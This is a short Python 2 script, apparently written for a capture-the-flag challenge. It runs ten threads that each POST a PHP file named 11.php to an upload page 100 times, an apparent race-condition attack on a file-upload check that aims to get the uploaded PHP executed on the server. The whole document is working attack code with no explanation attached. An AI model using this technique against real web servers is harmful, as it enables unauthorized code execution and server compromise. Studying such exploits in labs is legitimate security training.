#!/usr/bin/env python
#  -*- coding: utf-8 -*-
import pycurl
import time
import threading
from StringIO import StringIO

url = 'http://33.33.42.9:8011/11_f970e2767d0cfe75876ea857f92e319b/logic1.php'

class Upfile( threading.Thread ):
    def __init__( self, url ):
        super( Upfile,self ).__init__()
        self.url = url
        self.loop_cnt = 100

    def run( self ):
        while self.loop_cnt>0:
            buffer = StringIO()

            c = pycurl.Curl()
            c.setopt( pycurl.URL, self.url )
            c.setopt( pycurl.POST, True )
            c.setopt( pycurl.WRITEDATA, buffer )
            c.setopt( pycurl.HTTPPOST, [('file',(pycurl.FORM_FILE,'11.php', pycurl.FORM_FILENAME, '11.php'))])
            c.setopt( pycurl.TIMEOUT, 30 )
            c.perform()
            c.close()

            print buffer.getvalue()

            self.loop_cnt -= 1


thread_list = list()
for i in range( 10 ):
    t = Upfile( url )
    t.start()
    thread_list.append( t )

for t in thread_list:
    t.join()
